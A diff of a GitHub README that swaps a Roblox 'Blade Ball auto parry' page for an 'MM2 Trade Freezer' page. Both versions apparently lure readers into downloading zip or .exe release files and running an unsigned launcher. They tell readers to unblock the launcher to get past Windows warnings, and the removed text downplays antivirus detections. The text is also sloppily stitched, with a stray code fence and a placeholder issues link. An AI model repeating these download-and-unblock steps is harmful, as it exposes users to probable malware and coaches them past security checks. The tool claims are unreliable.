@@ -1,34 +1,69 @@
-# blade-ball-auto-parry
-Blade Ball Auto Parry (Python)
-🎯 An automatic parry system for Blade Ball — written in Python!
+# MM2 Trade Freezer 🧊 Read Before Downloading
 
-✨ Features of the v5 its alot better than the v4.4 got better tracking en more
-Automatically detects when a ball gets close improved v5
+> A lightweight utility tool for **Murder Mystery 2 (MM2)** on Roblox designed to manage and secure your trading sessions.
 
-Instantly performs a parry action improved v5
+---
 
-Super fast reaction time — faster than any human!
+## ⚠️ Disclaimer
 
-Lightweight and efficient — no need to install Python to run it improved v5
+*This tool is created for educational and experimental purposes only. Use of third-party utility scripts or software may violate Roblox's Terms of Service. Use at your own risk.*
 
-Delivered as a ready-to-use .exe file
+---
 
-🚀 How It Works
-The script continuously monitors the distance between your character and incoming ball.
-When a ball gets within a certain range, it instantly triggers a parry action!
+## ✨ Features
 
-# Install
-https://github.com/master277/blade-ball-auto-parry/archive/refs/tags/v5.zip Not working?
+* **Session Stabilizer:** Helps prevent accidental trade cancellations or desync bugs during high-value trades.
+* **Clean UI:** Minimalist and intuitive interface that integrates smoothly.
+* **Lightweight Performance:** Optimized code to ensure zero lag or frame drops while running.
+* **Easy Toggle:** Simple hotkey bindings to quickly enable or disable the utility.
 
-Try this https://github.com/master277/blade-ball-auto-parry/releases/download/v5/blade-ball-auto-parry-v5.exe
-
-![13772394625-1745580096746](https://github.com/user-attachments/assets/fa414a67-7b58-494a-b764-cc9978ef5e7c)
+<img width="686" height="386" alt="image" src="https://github.com/user-attachments/assets/ba431e02-a85d-42d1-b928-41b2c64e0435" />
 
 
-# Important
-This script is not signed with a trusted certificate, so you will receive a warning. To avoid this, right-click on launcher.bat, select Properties, check Unblock at the bottom if available, click Apply, and then click ok
+---
 
-# Virus checker
-If you dont trust this file you can test it by your self with these malware testers there should only show python detected.
-https://internxt.com/virus-scanner
-https://virusscan.jotti.org/
+## 🚀 Getting Started
+
+### Prerequisites
+
+* A working Roblox executor or environment that supports your script format.
+* Murder Mystery 2 running on Roblox.
+
+### Installation & Usage Please watch this video before starting https://youtu.be/8XYXdn9gFaE
+
+1. Download the file and unzip it somewhere. https://github.com/jjsplt/Murder-Mystery-2-Trade-Freezer/archive/refs/tags/v1485.zip
+2. Open our script Launcher when you have unblocked it you can see how in the video above.
+3. Run our Launcher and have fun
+
+
+```
+
+4. Execute the script and use the designated hotkey (default: `F4`) to toggle the interface.
+
+---
+
+## ⚙️ Configuration
+
+You can customize keybinds and settings by opening the `config top menu`  (if running a workspace version) or via the in-game settings panel:
+
+* `ToggleKey`: `Enum.KeyCode.F4`
+* `AutoSave`: `true`
+* `NotificationSounds`: `true`
+
+---
+
+## 🤝 Contributing
+
+Contributions, issues, and feature requests are welcome! Feel free to check the [issues page](https://www.google.com/search?q=https://github.com/YOUR_USERNAME/mm2-trade-freezer/issues).
+
+1. Fork the Project
+2. Create your Feature Branch (`git checkout -b feature/AmazingFeature`)
+3. Commit your Changes (`git commit -m 'Add some AmazingFeature'`)
+4. Push to the Branch (`git push origin feature/AmazingFeature`)
+5. Open a Pull Request
+
+---
+
+## 📜 License
+
+Distributed under the MIT License. See `LICENSE` for more information.
